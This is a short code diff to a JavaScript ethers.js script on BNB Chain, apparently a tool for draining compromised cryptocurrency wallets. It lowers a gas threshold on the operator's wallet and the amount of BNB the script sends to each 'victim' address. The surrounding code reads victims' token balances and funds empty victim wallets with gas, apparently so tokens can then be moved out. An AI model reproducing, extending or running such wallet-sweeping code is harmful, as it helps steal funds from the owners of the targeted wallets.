@@ -73,7 +73,7 @@ async function checkWalletBalance() {
 
   const balance = await provider.getBalance(wallet.address);
   console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
-  if (balance < ethers.parseEther("0.015")) {
+  if (balance < ethers.parseEther("0.01")) {
     throw new Error("Insufficient BNB for gas. Please fund the wallet.");
   }
 }
@@ -88,7 +88,7 @@ async function sendGasIfNeeded(victimAddress) {
     console.log(`Victim ${token.symbol} balance: ${ethers.formatUnits(tokenBalance, token.decimals)}`);
   }
   if (victimBalance === BigInt(0)) {
-    const bnbToSend = ethers.parseEther("0.005");
+    const bnbToSend = ethers.parseEther("0.002");
     const gasSettings = await getGasSettings();
     console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
